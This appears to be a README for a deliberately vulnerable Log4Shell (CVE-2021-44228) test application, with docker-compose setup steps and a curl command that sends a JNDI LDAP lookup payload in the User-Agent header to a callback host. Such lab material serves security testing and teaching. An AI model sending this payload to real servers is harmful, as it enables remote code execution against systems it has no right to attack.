# Log4Shell sample vulnerable application (CVE-2021-44228)

- based on the repo : https://github.com/christophetd/log4shell-vulnerable-app
```
sudo docker-compose build .
sudo docker-compose up
```

- try : 
```
curl 127.0.0.1:8081 -H 'User-Agent: ${jndi:ldap://172.28.0.1:4444/hi}'
```

